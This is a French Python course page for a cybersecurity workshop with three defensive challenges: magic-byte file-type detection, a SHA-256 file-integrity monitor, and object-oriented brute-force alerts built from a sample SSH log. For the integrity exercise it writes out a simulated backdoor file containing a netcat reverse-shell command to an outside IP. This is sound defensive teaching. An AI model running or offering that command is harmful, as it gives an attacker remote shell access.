@@ -1,0 +1,321 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Défis cyber – Jour 2 – 4PYTH</title>
+  <link rel="stylesheet" href="../assets/css/enonce.css">
+</head>
+<body>
+
+<header class="entete">
+  <div class="panneau"><img src="../assets/charte/logo-hexagone.png" alt="École Hexagone"></div>
+  <div class="titre">
+    <h1>Défis cyber – Jour 2</h1>
+    <p><span class="code-module">4PYTH</span> – Langage Python · Vendredi 9 octobre · 14h00 – 15h15</p>
+  </div>
+</header>
+
+<main>
+
+  <p>
+    Cet après-midi, vous combinez les deux cours du matin : les <strong>objets</strong> d'un côté,
+    les <strong>fichiers, octets et empreintes</strong> de l'autre. Comptez <strong>entre 20 et 30 minutes</strong> par défi.
+  </p>
+
+  <div class="encadre marine">
+    <span class="intitule">Règles du jeu</span>
+    <ul>
+      <li>Vous codez <strong>vous-mêmes, sans IA</strong> : ni ChatGPT, ni Claude, ni autocomplétion Copilot.</li>
+      <li>La <a href="https://docs.python.org/fr/3/" target="_blank">documentation Python</a> est autorisée et même encouragée.</li>
+      <li>Un fichier par défi : <code>defi4.py</code>, <code>defi5.py</code> et <code>defi6.py</code>.</li>
+      <li><strong>Validation</strong> : levez la main, exécutez votre code devant moi puis répondez à une question sur votre code.</li>
+      <li><strong>Notation</strong> : non fait (0), partiel (1) ou réussi (2). Les défis comptent pour 10 % de la note du module.</li>
+      <li><strong>Parcours confirmé</strong> : validez ces trois défis puis passez aux défis avancés.</li>
+    </ul>
+  </div>
+
+  <nav class="sommaire">
+    <a href="#defi-4"><span class="n">Défi 4</span><br>Fichiers déguisés</a>
+    <a href="#defi-5"><span class="n">Défi 5</span><br>Contrôle d'intégrité</a>
+    <a href="#defi-6"><span class="n">Défi 6</span><br>Alertes en objets</a>
+  </nav>
+
+  <!-- ================================================================== -->
+  <section class="defi" id="defi-4">
+    <h2><span class="num">4</span> Fichiers déguisés</h2>
+    <div class="meta"><span class="etiquette">≈ 20 min</span><span class="etiquette clair">Octets · mode binaire · dictionnaires</span><span class="etiquette ambre">Forensic</span></div>
+
+    <p>
+      Un attaquant a glissé un exécutable Windows dans une pièce jointe nommée <code>facture.pdf</code>. L'extension ment,
+      mais les premiers octets du fichier, ses <strong>magic bytes</strong>, disent la vérité. Votre mission : écrire l'outil
+      qui démasque les fichiers déguisés.
+    </p>
+
+    <h3>Votre mission</h3>
+    <ol>
+      <li>Copiez les données ci-dessous. Écrivez <code>create_samples(folder)</code>, qui crée le dossier puis chaque fichier de
+        <code>SAMPLES</code> en <strong>écrivant ses octets</strong> (mode <code>"wb"</code>).</li>
+      <li>Écrivez <code>detect_type(path)</code>, qui lit les premiers octets du fichier et renvoie son type réel d'après
+        <code>SIGNATURES</code>. Si le type est inconnu, elle renvoie <code>None</code>.</li>
+      <li>Écrivez <code>check_extension(path)</code>, qui renvoie un tuple : l'extension est-elle conforme (<code>True</code> ou <code>False</code>)
+        puis le type réel.</li>
+      <li>Écrivez <code>scan(folder)</code>, qui affiche un verdict pour chaque fichier du dossier, dans l'ordre alphabétique.</li>
+    </ol>
+
+    <pre data-titre="Données à copier"><code class="language-python">
+      SIGNATURES = {
+          b"%PDF": "pdf",
+          b"\x89PNG": "png",
+          b"\xff\xd8\xff": "jpg",
+          b"PK\x03\x04": "zip",
+          b"MZ": "exe",
+      }
+
+      SAMPLES = {
+          "rapport.pdf": b"%PDF-1.7\n% rapport d'audit",
+          "logo.png": b"\x89PNG\r\n\x1a\n image",
+          "photo.jpg": b"\x89PNG\r\n\x1a\n image",
+          "archive.zip": b"PK\x03\x04 contenu",
+          "facture.pdf": b"MZ\x90\x00 programme Windows",
+          "notes.txt": b"Liste des serveurs a auditer",
+      }
+    </code></pre>
+
+    <h3>Exemples attendus</h3>
+    <pre data-titre="Résultats attendus"><code class="language-python">
+      create_samples("echantillons")
+
+      print(detect_type("echantillons/photo.jpg"))
+      # png
+
+      print(check_extension("echantillons/facture.pdf"))
+      # (False, 'exe')
+
+      scan("echantillons")
+      # [OK] archive.zip
+      # [ALERTE] facture.pdf est en réalité un exe
+      # [OK] logo.png
+      # [?] notes.txt : type inconnu
+      # [ALERTE] photo.jpg est en réalité un png
+      # [OK] rapport.pdf
+    </code></pre>
+
+    <details>
+      <summary>Indices</summary>
+      <ul>
+        <li>Lisez l'en-tête en mode <code>"rb"</code> : en mode texte, l'octet <code>\x89</code> provoque une erreur de décodage.</li>
+        <li>Les signatures n'ont pas toutes la même longueur : lisez 8 octets et utilisez <code>startswith()</code>.</li>
+        <li>Avec <a href="https://docs.python.org/fr/3/library/pathlib.html" target="_blank"><code>pathlib</code></a> :
+          <code>Path(folder).iterdir()</code> parcourt un dossier, <code>path.suffix</code> donne <code>".pdf"</code> et
+          <code>path.name</code> le nom du fichier.</li>
+      </ul>
+    </details>
+
+    <div class="encadre">
+      <span class="intitule">Pour valider, montrez-moi…</span>
+      <ul>
+        <li>le dossier <code>echantillons</code> créé par votre programme ;</li>
+        <li>les trois exemples ci-dessus, qui donnent exactement ces résultats.</li>
+      </ul>
+    </div>
+
+    <h3>Bonus</h3>
+    <ul>
+      <li>Un exécutable déguisé est bien plus grave qu'une image mal nommée : affichez-le avec le niveau <code>[CRITICAL]</code>.</li>
+      <li>Lancez votre scan sur votre vrai dossier de téléchargements. Votre outil ne fait que <strong>lire</strong> : il ne modifie rien.</li>
+    </ul>
+  </section>
+
+  <!-- ================================================================== -->
+  <section class="defi" id="defi-5">
+    <h2><span class="num">5</span> Contrôle d'intégrité</h2>
+    <div class="meta"><span class="etiquette">≈ 30 min</span><span class="etiquette clair">hashlib · JSON · ensembles</span><span class="etiquette ambre">SOC</span></div>
+
+    <p>
+      Après une intrusion, un attaquant modifie souvent des fichiers de configuration, supprime des traces ou dépose une
+      porte dérobée. Les outils de <strong>surveillance de l'intégrité des fichiers</strong> (FIM, comme AIDE ou Tripwire)
+      calculent l'empreinte de chaque fichier puis comparent avec une <strong>référence</strong>. Vous allez écrire le vôtre.
+    </p>
+
+    <h3>Votre mission</h3>
+    <ol>
+      <li>Créez un dossier <code>surveille</code> contenant les trois fichiers de <code>INITIAL_FILES</code>.</li>
+      <li>Écrivez <code>sha256_file(path)</code>, qui renvoie l'empreinte SHA-256 d'un fichier lu <strong>par blocs</strong>.</li>
+      <li>Écrivez <code>build_baseline(folder)</code>, qui renvoie un dictionnaire <code>{nom du fichier: empreinte}</code>.</li>
+      <li>Écrivez <code>save_baseline(baseline, json_path)</code> et <code>load_baseline(json_path)</code>.</li>
+      <li>Écrivez <code>compare(old, new)</code>, qui renvoie un dictionnaire des fichiers <strong>ajoutés</strong>,
+        <strong>modifiés</strong> et <strong>supprimés</strong>, chaque liste triée.</li>
+      <li>Simulez l'intrusion décrite ci-dessous puis affichez le rapport.</li>
+    </ol>
+
+    <pre data-titre="Données à copier"><code class="language-python">
+      INITIAL_FILES = {
+          "config.txt": "port=22\npermit_root_login=no\n",
+          "users.txt": "alice\nbob\ncarol\n",
+          "backup.sh": "tar -czf /backup/etc.tar.gz /etc\n",
+      }
+    </code></pre>
+
+    <div class="encadre marine">
+      <span class="intitule">L'intrusion à simuler, après avoir sauvegardé la référence</span>
+      <ul>
+        <li>dans <code>config.txt</code>, <code>permit_root_login=no</code> devient <code>permit_root_login=yes</code> ;</li>
+        <li><code>backup.sh</code> est supprimé ;</li>
+        <li>un fichier <code>backdoor.sh</code> apparaît, contenant <code>nc -e /bin/sh 203.0.113.45 4444</code>.</li>
+      </ul>
+    </div>
+
+    <h3>Exemples attendus</h3>
+    <pre data-titre="Résultats attendus"><code class="language-python">
+      reference = build_baseline("surveille")
+      print(reference["config.txt"])
+      # 4e6c73486e42ac00fdf8ded97f2487a1d3849ed636b4a1420e436cc8476bf662
+      save_baseline(reference, "reference.json")
+
+      # ... intrusion ...
+
+      print(compare(load_baseline("reference.json"), build_baseline("surveille")))
+      # {'added': ['backdoor.sh'], 'modified': ['config.txt'], 'deleted': ['backup.sh']}
+    </code></pre>
+    <p class="muet" style="font-size: 14px;">
+      Sous Windows, votre empreinte de <code>config.txt</code> sera différente : en mode texte, Python y écrit les fins de ligne
+      <code>\r\n</code> au lieu de <code>\n</code>. Un seul octet de plus suffit à changer toute l'empreinte. C'est justement le principe !
+    </p>
+
+    <details>
+      <summary>Indices</summary>
+      <ul>
+        <li>Revoyez la diapo « Empreinte SHA-256 » du cours 3 pour la lecture par blocs.</li>
+        <li>Les <a href="https://docs.python.org/fr/3/tutorial/datastructures.html#sets" target="_blank">ensembles</a> font le gros du travail :
+          <code>set(new) - set(old)</code> donne les noms présents seulement dans <code>new</code> ;
+          <code>set(old) &amp; set(new)</code> ceux présents dans les deux.</li>
+        <li>Ne rangez pas <code>reference.json</code> dans le dossier surveillé. Devinez pourquoi !</li>
+      </ul>
+    </details>
+
+    <div class="encadre">
+      <span class="intitule">Pour valider, montrez-moi…</span>
+      <ul>
+        <li>le fichier <code>reference.json</code> ;</li>
+        <li>le rapport après l'intrusion, qui donne exactement le résultat attendu.</li>
+      </ul>
+    </div>
+
+    <h3>Bonus</h3>
+    <ul>
+      <li>Affichez un rapport lisible : <code>[+] ajouté</code>, <code>[~] modifié</code>, <code>[-] supprimé</code>.</li>
+      <li>Relancez le scan automatiquement toutes les 5 secondes avec <code>time.sleep()</code> et modifiez un fichier pendant ce temps.</li>
+      <li>Réfléchissez : un attaquant administrateur de la machine peut-il tromper votre outil ? Comment protéger la référence ?</li>
+    </ul>
+  </section>
+
+  <!-- ================================================================== -->
+  <section class="defi" id="defi-6">
+    <h2><span class="num">6</span> Alertes en objets</h2>
+    <div class="meta"><span class="etiquette">≈ 25 min</span><span class="etiquette clair">Héritage · polymorphisme · fichiers · JSON</span><span class="etiquette ambre">SOC</span></div>
+
+    <p>
+      Votre détecteur de brute force du défi 2 fonctionne. Il faut maintenant l'industrialiser comme dans un SIEM : lire un
+      vrai fichier de journal, produire des <strong>alertes typées</strong> et les exporter en JSON pour les autres outils du SOC.
+    </p>
+
+    <h3>Votre mission</h3>
+    <ol>
+      <li>Écrivez le journal <code>AUTH_LOG</code> du défi 2 (rappelé ci-dessous) dans un fichier <code>auth.log</code>, une ligne par élément.</li>
+      <li>Créez une classe <code>Alert</code> :
+        <ul>
+          <li>un <strong>attribut de classe</strong> <code>severity = "INFO"</code> et un attribut <code>ip</code> ;</li>
+          <li>une méthode <code>describe()</code> qui renvoie <code>[INFO] activité suspecte depuis &lt;ip&gt;</code> ;</li>
+          <li>une méthode <code>to_dict()</code> qui renvoie <code>{"severity": …, "ip": …, "message": …}</code>.</li>
+        </ul>
+      </li>
+      <li>Créez deux classes filles qui redéfinissent <code>severity</code> et <code>describe()</code> :
+        <ul>
+          <li><code>BruteForceAlert(ip, failures)</code>, de sévérité <code>"HIGH"</code> ;</li>
+          <li><code>CompromiseAlert(ip, user)</code>, de sévérité <code>"CRITICAL"</code> : une IP qui réussit à se connecter après un brute force.</li>
+        </ul>
+      </li>
+      <li>Écrivez <code>analyze(path, threshold=5)</code>, qui <strong>lit le fichier</strong> et renvoie la liste des alertes.</li>
+      <li>Affichez chaque alerte puis enregistrez-les toutes dans <code>rapport.json</code>.</li>
+    </ol>
+
+    <details>
+      <summary>Données à copier – le journal du défi 2</summary>
+      <pre class="donnees" data-titre="Données à copier – journal d'authentification"><code class="language-python">
+        AUTH_LOG = [
+            "Oct  7 09:12:03 srv-web sshd[2101]: Accepted password for alice from 192.0.2.10 port 50122 ssh2",
+            "Oct  7 09:40:17 srv-web sshd[2144]: Failed password for bob from 192.0.2.25 port 50388 ssh2",
+            "Oct  7 09:40:29 srv-web sshd[2144]: Accepted password for bob from 192.0.2.25 port 50388 ssh2",
+            "Oct  7 10:02:11 srv-web sshd[2210]: Failed password for root from 203.0.113.45 port 51122 ssh2",
+            "Oct  7 10:02:14 srv-web sshd[2212]: Failed password for root from 203.0.113.45 port 51130 ssh2",
+            "Oct  7 10:02:18 srv-web sshd[2215]: Failed password for invalid user admin from 203.0.113.45 port 51141 ssh2",
+            "Oct  7 10:02:21 srv-web sshd[2218]: Failed password for invalid user test from 203.0.113.45 port 51150 ssh2",
+            "Oct  7 10:02:25 srv-web sshd[2221]: Failed password for alice from 203.0.113.45 port 51162 ssh2",
+            "Oct  7 10:02:29 srv-web sshd[2224]: Failed password for alice from 203.0.113.45 port 51170 ssh2",
+            "Oct  7 10:02:33 srv-web sshd[2227]: Failed password for alice from 203.0.113.45 port 51178 ssh2",
+            "Oct  7 10:02:36 srv-web sshd[2230]: Accepted password for alice from 203.0.113.45 port 51185 ssh2",
+            "Oct  7 10:02:37 srv-web sshd[2230]: pam_unix(sshd:session): session opened for user alice by (uid=0)",
+            "Oct  7 10:15:40 srv-web sshd[2301]: Failed password for invalid user oracle from 198.51.100.23 port 40022 ssh2",
+            "Oct  7 10:15:44 srv-web sshd[2303]: Failed password for invalid user postgres from 198.51.100.23 port 40031 ssh2",
+            "Oct  7 10:15:47 srv-web sshd[2305]: Failed password for root from 198.51.100.23 port 40040 ssh2",
+            "Oct  7 10:15:51 srv-web sshd[2307]: Failed password for invalid user ubuntu from 198.51.100.23 port 40052 ssh2",
+            "Oct  7 10:15:55 srv-web sshd[2309]: Failed password for invalid user pi from 198.51.100.23 port 40060 ssh2",
+            "Oct  7 10:16:02 srv-web sshd[2311]: Connection closed by 198.51.100.23 port 40071 [preauth]",
+            "Oct  7 11:30:08 srv-web sshd[2402]: Failed password for carol from 198.51.100.77 port 42210 ssh2",
+            "Oct  7 11:30:15 srv-web sshd[2404]: Failed password for carol from 198.51.100.77 port 42218 ssh2",
+            "Oct  7 11:31:02 srv-web sshd[2410]: Accepted password for carol from 198.51.100.77 port 42230 ssh2",
+        ]
+      </code></pre>
+    </details>
+
+    <h3>Exemples attendus</h3>
+    <pre data-titre="Résultats attendus"><code class="language-python">
+      alerts = analyze("auth.log")
+      for alert in alerts:
+          print(alert.describe())
+      # [HIGH] brute force depuis 203.0.113.45 : 7 échecs
+      # [HIGH] brute force depuis 198.51.100.23 : 5 échecs
+      # [CRITICAL] 203.0.113.45 s'est connecté au compte alice après un brute force
+
+      print(Alert("192.0.2.99").describe())
+      # [INFO] activité suspecte depuis 192.0.2.99
+
+      print(isinstance(alerts[0], Alert))
+      # True
+    </code></pre>
+
+    <details>
+      <summary>Indices</summary>
+      <ul>
+        <li>Revoyez les diapos « Attributs de classe ou d'instance », « Hériter d'une classe » et « Le polymorphisme » du cours 2.</li>
+        <li><code>to_dict()</code> ne s'écrit <strong>qu'une fois</strong>, dans <code>Alert</code> : en appelant <code>self.describe()</code>,
+          elle utilisera automatiquement la bonne version.</li>
+        <li>Pour que les accents restent lisibles dans <code>rapport.json</code> : <code>json.dump(…, indent=2, ensure_ascii=False)</code>.</li>
+      </ul>
+    </details>
+
+    <div class="encadre">
+      <span class="intitule">Pour valider, montrez-moi…</span>
+      <ul>
+        <li>les trois exemples ci-dessus, qui donnent exactement ces résultats ;</li>
+        <li>le fichier <code>rapport.json</code> ouvert dans VS Code.</li>
+      </ul>
+    </div>
+
+    <h3>Bonus</h3>
+    <ul>
+      <li>Triez les alertes de la plus grave à la moins grave.</li>
+      <li>Ajoutez une méthode <code>__str__</code> pour afficher une alerte avec un simple <code>print(alert)</code>.</li>
+      <li>Filtrez les alertes par sévérité grâce à un argument de la ligne de commande : <code>python defi6.py CRITICAL</code> (<code>sys.argv</code>).</li>
+    </ul>
+  </section>
+
+</main>
+
+<footer class="pied">Chris CHEVALIER · 4PYTH – Langage Python · École Hexagone</footer>
+
+<script src="../assets/vendor/reveal/plugin/highlight/highlight.js"></script>
+<script src="../assets/js/enonce.js"></script>
+</body>
+</html>
